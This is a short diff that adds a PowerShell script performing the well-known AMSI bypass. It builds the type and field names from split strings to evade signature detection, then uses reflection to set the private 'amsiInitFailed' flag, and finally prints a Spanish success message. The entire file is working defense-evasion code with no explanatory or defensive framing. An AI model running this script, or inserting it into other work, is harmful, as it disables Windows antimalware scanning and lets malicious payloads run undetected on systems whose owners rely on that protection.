@@ -1,0 +1,6 @@
+$a = 'System.Management.Automation.A'
+$b = 'msiUtils'
+$c = [Ref].Assembly.GetType($a + $b)
+$d = $c.GetField('amsiIn' + 'itFailed', 'NonPublic,Static')
+$d.SetValue($null, $true)
+Write-Host "[+] AMSI bypass aplicado" -ForegroundColor Green   
